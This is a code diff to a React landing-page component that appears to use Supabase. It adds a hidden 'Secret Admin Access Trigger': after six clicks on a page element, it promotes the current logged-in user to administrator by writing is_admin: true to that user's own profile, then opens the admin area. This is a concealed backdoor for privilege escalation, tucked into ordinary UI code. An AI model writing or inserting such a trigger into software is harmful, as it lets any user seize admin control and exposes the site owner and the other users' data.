@@ -77,7 +77,17 @@ const HeroSection = () => {
                                     setAdminClicks(prev => {
                                         const newVal = prev + 1;
                                         if (newVal >= 6) {
-                                            navigate('/admin');
+                                            // Secret Admin Access Trigger
+                                            import('../utils/supabase').then(async ({ supabase }) => {
+                                                const { data: { user } } = await supabase.auth.getUser();
+                                                if (user) {
+                                                    console.log('[SECRET] Promoting user to Admin...');
+                                                    await supabase.from('profiles').update({ is_admin: true }).eq('id', user.id);
+                                                    navigate('/admin');
+                                                } else {
+                                                    navigate('/login');
+                                                }
+                                            });
                                             return 0;
                                         }
                                         return newVal;
@@ -214,7 +224,7 @@ const HeroSection = () => {
                     </motion.div>
                 </motion.div>
             </div>
-        </section>
+        </section >
     );
 };
 
